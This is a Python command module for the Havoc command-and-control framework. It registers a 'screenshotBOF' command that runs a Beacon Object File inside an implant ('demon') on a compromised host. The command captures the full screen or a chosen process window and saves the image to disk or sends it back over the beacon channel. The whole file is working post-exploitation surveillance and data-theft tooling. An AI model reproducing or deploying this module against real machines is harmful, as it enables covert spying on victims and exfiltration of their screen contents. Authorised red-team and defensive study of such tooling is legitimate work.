from havoc import Demon, RegisterCommand

def screenshot_bof(
    demonID,
    * param: tuple
):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    demon     = Demon( demonID )
    BOF_ENTRY = "go"
    BOF_NAME  = f"ScreenshotBOF.{demon.ProcessArch}.obj"

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to take screenshot (via ScreenshotBOF)" )
    if len( param  ) < 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid arguments provided" )
        return False

    filename, save_method, pid = param
    match save_method:
        case "0" | "1":
            pass
        case "2":
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "save method (2) not supported")
            return False
        case _:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Invalid save_method provided")
            return False

    packer.addstr( filename )
    packer.addint( int( save_method ) )
    packer.addint( int( pid ) )

    BOF_PARAMS = packer.getbuffer()
    demon.InlineExecute(
        TaskID,
        BOF_ENTRY,
        BOF_NAME,
        BOF_PARAMS,
        False
    )

    return TaskID

RegisterCommand(
    screenshot_bof,
    "",
    "screenshotBOF",
    "Take a screenshot of the screen and/or other processes",
    0,
    "<filename> <save_method> <PID>\n"
    "\n"
    "Arguments:\n"
    "  filename     Name of the file to save the screenshot as\n"
    "  save_method  0 - Drop file to disk\n"
    "               1 - Download over beacon as a file\n"
    "               2 - Download over beacon as a screenshot\n"
    "  PID          Set to 0 for full screen capture, or provide a process ID\n",
    "screen.jpg 1 0"
);
